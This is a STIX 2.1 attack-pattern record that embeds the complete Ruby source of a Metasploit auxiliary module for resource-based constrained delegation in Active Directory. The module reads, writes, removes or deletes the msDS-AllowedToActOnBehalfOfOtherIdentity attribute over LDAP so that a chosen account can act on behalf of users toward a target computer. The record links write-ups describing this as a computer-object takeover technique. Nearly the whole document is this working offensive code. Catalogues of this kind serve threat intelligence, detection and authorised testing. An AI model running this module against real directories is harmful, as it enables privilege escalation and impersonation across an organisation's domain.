{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ab8b439b-6b5f-41d6-b3ee-8207e9c63cd6",
    "created": "2024-08-14T16:22:20.528563Z",
    "modified": "2024-08-14T16:22:20.528567Z",
    "name": "Role Base Constrained Delegation",
    "description": " This module can read and write the necessary LDAP attributes to configure a particular object for Role Based Constrained Delegation (RBCD). When writing, the module will add an access control entry to allow the account specified in DELEGATE_FROM to the object specified in DELEGATE_TO. In order for this to succeed, the authenticated user must have write access to the target object (the object specified in DELEGATE_TO). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/ldap/rbcd.rb",
            "external_id": "rbcd.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution"
        },
        {
            "source_name": "reference",
            "url": "https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/SecureAuthCorp/impacket/blob/3c6713e309cae871d685fa443d3e21b7026a2155/examples/rbcd.py"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  include Msf::Exploit::Remote::LDAP\n\n  ATTRIBUTE = 'msDS-AllowedToActOnBehalfOfOtherIdentity'.freeze\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Role Base Constrained Delegation',\n        'Description' => %q{\n          This module can read and write the necessary LDAP attributes to configure a particular object for Role Based\n          Constrained Delegation (RBCD). When writing, the module will add an access control entry to allow the account\n          specified in DELEGATE_FROM to the object specified in DELEGATE_TO. In order for this to succeed, the\n          authenticated user must have write access to the target object (the object specified in DELEGATE_TO).\n        },\n        'Author' => [\n          'Podalirius', # Remi Gascou (@podalirius_), Impacket reference implementation\n          'Charlie Bromberg', # Charlie Bromberg (@_nwodtuhs), Impacket reference implementation\n          'Spencer McIntyre' # module author\n        ],\n        'References' => [\n          ['URL', 'https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution'],\n          ['URL', 'https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd'],\n          ['URL', 'https://github.com/SecureAuthCorp/impacket/blob/3c6713e309cae871d685fa443d3e21b7026a2155/examples/rbcd.py']\n        ],\n        'License' => MSF_LICENSE,\n        'Actions' => [\n          ['FLUSH', { 'Description' => 'Delete the security descriptor' }],\n          ['READ', { 'Description' => 'Read the security descriptor' }],\n          ['REMOVE', { 'Description' => 'Remove matching ACEs from the security descriptor DACL' }],\n          ['WRITE', { 'Description' => 'Add an ACE to the security descriptor DACL' }]\n        ],\n        'DefaultAction' => 'READ',\n        'Notes' => {\n          'Stability' => [],\n          'SideEffects' => [CONFIG_CHANGES], # REMOVE, FLUSH, WRITE all make changes\n          'Reliability' => []\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('DELEGATE_TO', [ true, 'The delegation target' ]),\n      OptString.new('DELEGATE_FROM', [ false, 'The delegation source' ])\n    ])\n  end\n\n  def build_ace(sid)\n    Rex::Proto::MsDtyp::MsDtypAce.new({\n      header: {\n        ace_type: Rex::Proto::MsDtyp::MsDtypAceType::ACCESS_ALLOWED_ACE_TYPE\n      },\n      body: {\n        access_mask: Rex::Proto::MsDtyp::MsDtypAccessMask::ALL,\n        sid: sid\n      }\n    })\n  end\n\n  def fail_with_ldap_error(message)\n    ldap_result = @ldap.get_operation_result.table\n    return if ldap_result[:code] == 0\n\n    print_error(message)\n    # Codes taken from https://ldap.com/ldap-result-code-reference-core-ldapv3-result-codes\n    case ldap_result[:code]\n    when 1\n      fail_with(Failure::Unknown, \"An LDAP operational error occurred. The error was: #{ldap_result[:error_message].strip}\")\n    when 16\n      fail_with(Failure::NotFound, 'The LDAP operation failed because the referenced attribute does not exist.')\n    when 50\n      fail_with(Failure::NoAccess, 'The LDAP operation failed due to insufficient access rights.')\n    when 51\n      fail_with(Failure::UnexpectedReply, 'The LDAP operation failed because the server is too busy to perform the request.')\n    when 52\n      fail_with(Failure::UnexpectedReply, 'The LDAP operation failed because the server is not currently available to process the request.')\n    when 53\n      fail_with(Failure::UnexpectedReply, 'The LDAP operation failed because the server is unwilling to perform the request.')\n    when 64\n      fail_with(Failure::Unknown, 'The LDAP operation failed due to a naming violation.')\n    when 65\n      fail_with(Failure::Unknown, 'The LDAP operation failed due to an object class violation.')\n    end\n\n    fail_with(Failure::Unknown, \"Unknown LDAP error occurred: result: #{ldap_result[:code]} message: #{ldap_result[:error_message].strip}\")\n  end\n\n  def get_delegate_from_obj\n    delegate_from = datastore['DELEGATE_FROM']\n    if delegate_from.blank?\n      fail_with(Failure::BadConfig, 'The DELEGATE_FROM option must be specified for this action.')\n    end\n\n    obj = ldap_get(\"(sAMAccountName=#{delegate_from})\", attributes: ['sAMAccountName', 'ObjectSID'])\n    if obj.nil? && !delegate_from.end_with?('$')\n      obj = ldap_get(\"(sAMAccountName=#{delegate_from}$)\", attributes: ['sAMAccountName', 'ObjectSID'])\n    end\n    fail_with(Failure::NotFound, \"Failed to find sAMAccountName: #{delegate_from}\") unless obj\n\n    obj\n  end\n\n  def ldap_get(filter, attributes: [])\n    raw_obj = @ldap.search(base: @base_dn, filter: filter, attributes: attributes).first\n    return nil unless raw_obj\n\n    obj = {}\n\n    obj['dn'] = raw_obj['dn'].first.to_s\n    unless raw_obj['sAMAccountName'].empty?\n      obj['sAMAccountName'] = raw_obj['sAMAccountName'].first.to_s\n    end\n\n    unless raw_obj['ObjectSid'].empty?\n      obj['ObjectSid'] = Rex::Proto::MsDtyp::MsDtypSid.read(raw_obj['ObjectSid'].first)\n    end\n\n    unless raw_obj[ATTRIBUTE].empty?\n      obj[ATTRIBUTE] = Rex::Proto::MsDtyp::MsDtypSecurityDescriptor.read(raw_obj[ATTRIBUTE].first)\n    end\n\n    obj\n  end\n\n  def run\n    ldap_connect do |ldap|\n      validate_bind_success!(ldap)\n\n      if (@base_dn = datastore['BASE_DN'])\n        print_status(\"User-specified base DN: #{@base_dn}\")\n      else\n        print_status('Discovering base DN automatically')\n\n        unless (@base_dn = discover_base_dn(ldap))\n          print_warning(\"Couldn't discover base DN!\")\n        end\n      end\n      @ldap = ldap\n\n      delegate_to = datastore['DELEGATE_TO']\n      obj = ldap_get(\"(sAMAccountName=#{delegate_to})\", attributes: ['sAMAccountName', 'ObjectSID', ATTRIBUTE])\n      if obj.nil? && !delegate_to.end_with?('$')\n        obj = ldap_get(\"(sAMAccountName=#{delegate_to}$)\", attributes: ['sAMAccountName', 'ObjectSID', ATTRIBUTE])\n      end\n      fail_with(Failure::NotFound, \"Failed to find sAMAccountName: #{delegate_to}\") unless obj\n\n      send(\"action_#{action.name.downcase}\", obj)\n    end\n  rescue Net::LDAP::Error => e\n    print_error(\"#{e.class}: #{e.message}\")\n  end\n\n  def action_read(obj)\n    security_descriptor = obj[ATTRIBUTE]\n    if security_descriptor.nil?\n      print_status('The msDS-AllowedToActOnBehalfOfOtherIdentity field is empty.')\n      return\n    end\n\n    if security_descriptor.dacl.nil?\n      print_status('The msDS-AllowedToActOnBehalfOfOtherIdentity DACL field is empty.')\n      return\n    end\n\n    print_status('Allowed accounts:')\n    security_descriptor.dacl.aces.each do |ace|\n      account_name = ldap_get(\"(ObjectSid=#{ace.body.sid})\", attributes: ['sAMAccountName'])\n      if account_name\n        print_status(\"  #{ace.body.sid} (#{account_name['sAMAccountName']})\")\n      else\n        print_status(\"  #{ace.body.sid}\")\n      end\n    end\n  end\n\n  def action_remove(obj)\n    delegate_from = get_delegate_from_obj\n\n    security_descriptor = obj[ATTRIBUTE]\n    unless security_descriptor.dacl && !security_descriptor.dacl.aces.empty?\n      print_status('No DACL ACEs are present. No changes are necessary.')\n      return\n    end\n\n    aces = security_descriptor.dacl.aces.snapshot\n    aces.delete_if { |ace| ace.body[:sid] == delegate_from['ObjectSid'] }\n    delta = security_descriptor.dacl.aces.length - aces.length\n    if delta == 0\n      print_status('No DACL ACEs matched. No changes are necessary.')\n      return\n    else\n      print_status(\"Removed #{delta} matching ACE#{delta > 1 ? 's' : ''}.\")\n    end\n    security_descriptor.dacl.aces = aces\n    # clear these fields so they'll be calculated automatically after the update\n    security_descriptor.dacl.acl_count.clear\n    security_descriptor.dacl.acl_size.clear\n\n    unless @ldap.replace_attribute(obj['dn'], ATTRIBUTE, security_descriptor.to_binary_s)\n      fail_with_ldap_error('Failed to update the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')\n    end\n    print_good('Successfully updated the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')\n  end\n\n  def action_flush(obj)\n    unless obj[ATTRIBUTE]\n      print_status('The msDS-AllowedToActOnBehalfOfOtherIdentity field is empty. No changes are necessary.')\n      return\n    end\n\n    unless @ldap.delete_attribute(obj['dn'], ATTRIBUTE)\n      fail_with_ldap_error('Failed to deleted the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')\n    end\n\n    print_good('Successfully deleted the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')\n  end\n\n  def action_write(obj)\n    delegate_from = get_delegate_from_obj\n    if obj[ATTRIBUTE]\n      _action_write_update(obj, delegate_from)\n    else\n      _action_write_create(obj, delegate_from)\n    end\n  end\n\n  def _action_write_create(obj, delegate_from)\n    security_descriptor = Rex::Proto::MsDtyp::MsDtypSecurityDescriptor.new\n    security_descriptor.owner_sid = Rex::Proto::MsDtyp::MsDtypSid.new('S-1-5-32-544')\n    security_descriptor.dacl = Rex::Proto::MsDtyp::MsDtypAcl.new\n    security_descriptor.dacl.acl_revision = Rex::Proto::MsDtyp::MsDtypAcl::ACL_REVISION_DS\n    security_descriptor.dacl.aces << build_ace(delegate_from['ObjectSid'])\n\n    unless @ldap.add_attribute(obj['dn'], ATTRIBUTE, security_descriptor.to_binary_s)\n      fail_with_ldap_error('Failed to create the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')\n    end\n\n    print_good('Successfully created the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')\n    print_status('Added account:')\n    print_status(\"  #{delegate_from['ObjectSid']} (#{delegate_from['sAMAccountName']})\")\n  end\n\n  def _action_write_update(obj, delegate_from)\n    security_descriptor = obj[ATTRIBUTE]\n    if security_descriptor.dacl\n      if security_descriptor.dacl.aces.any? { |ace| ace.body[:sid].to_s == delegate_from['ObjectSid'].to_s }\n        print_status(\"Delegation from #{delegate_from['sAMAccountName']} to #{obj['sAMAccountName']} is already enabled.\")\n      end\n      # clear these fields so they'll be calculated automatically after the update\n      security_descriptor.dacl.acl_count.clear\n      security_descriptor.dacl.acl_size.clear\n    else\n      security_descriptor.control.dp = 1\n      security_descriptor.dacl = Rex::Proto::MsDtyp::MsDtypAcl.new\n      security_descriptor.dacl.acl_revision = Rex::Proto::MsDtyp::MsDtypAcl::ACL_REVISION_DS\n    end\n\n    security_descriptor.dacl.aces << build_ace(delegate_from['ObjectSid'])\n\n    unless @ldap.replace_attribute(obj['dn'], ATTRIBUTE, security_descriptor.to_binary_s)\n      fail_with_ldap_error('Failed to update the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')\n    end\n\n    print_good('Successfully updated the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')\n  end\nend\n"
}